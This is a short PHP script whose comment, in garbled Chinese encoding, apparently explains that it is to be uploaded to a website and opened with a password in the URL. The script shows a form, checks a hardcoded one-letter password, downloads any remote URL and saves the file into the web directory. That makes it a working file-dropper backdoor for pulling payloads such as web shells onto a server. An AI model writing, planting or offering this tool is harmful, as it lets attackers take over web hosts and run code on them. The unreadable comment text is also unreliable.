//����Ϊxx.php,Ȼ��ͨ��xx.php?pwd=e���ʻ���ʾ�������ַ��������һ��������php����վ��Ȼ���ϴ�ȥ...�����Լ������ļ����������ڵ�ǰĿ¼��Ȼ��ȥ���ʼ���

<form method="post"> 
<input name="url" size="50" /> 
<input name="submit" type="submit" /> 
</form> 
<?php 
$pwd='e';//����Ϊ������� 
if ($_REQUEST['pwd']!=$pwd) 
exit('Sorry ,you are not validate user!'); 
// maximum execution time in seconds 
set_time_limit (24 * 60 * 60); 
if (!isset($_POST['submit'])) die(); 
// folder to save downloaded files to. must end with slash 
$destination_folder = './'; 
$url = $_POST['url']; 
$newfname = $destination_folder . basename($url); 
$file = fopen ($url, "rb"); 
if ($file) { 
$newf = fopen ($newfname, "wb"); 
if ($newf) 
while(!feof($file)) 
{ 
fwrite($newf, fread($file, 1024 * 8 ), 1024 * 8 ); 
} 
} 
if ($file) 
{ 
fclose($file); 
} 
if ($newf) { 
fclose($newf); 
echo 'OK,File has been downloaded!'; 
} 
?> 